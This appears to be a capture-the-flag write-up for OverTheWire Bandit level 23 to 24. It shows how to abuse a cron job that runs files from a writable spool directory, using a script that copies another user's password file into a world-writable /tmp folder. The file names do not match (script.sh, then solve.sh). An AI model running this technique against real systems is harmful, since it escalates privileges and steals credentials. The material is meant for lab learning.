# OverTheWire - Bandit - Level 23 -> Level 24

## 🎯 Objective
Recreate the logic of a bash script

## 🛠️ Tools & Concepts Used
* `cron` - time based job scheduler 
* `bash` - interactive command interpreter and command language 

## 📝 Step-by-Step Solution

**1. Descover the cronjob's instructions**
First I read the commands into the `cronjob_bandit24.sh` to descover waht it does

```bash
cat /usr/bin/cronjob_bandit24.sh
```
There I saw it executes every file into `/var/spool/"$myname"/foo`, so I had to exploit it

**1. Prepare the workspace**
I had to first create a temporary directory where I could create my script

```bash
mkdir /tmp/mystuff && cd /tmp/mystuff
```
In this directory I created my script

```bash
vim script.sh
```

**2. Write the script**
Then, I made a simple script that would read the password and add it to my workspace

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mystuff/password.txt
```
Then I gave the right permissions to it

```bash
chmod 777 solve.sh
```

**3. Give it to cronjob's target directory**
First, I give permissions for my folder

```bash
chmod 777 /tmp/mystuff
```

Then I copied the script into the target directory

```bash
cp solve.sh /var/spool/bandit24/foo/
```

After a minute, it did its job and provied the password for the next level.

## 💡 Key Takeaway
Practiced script interpretation and reproduction
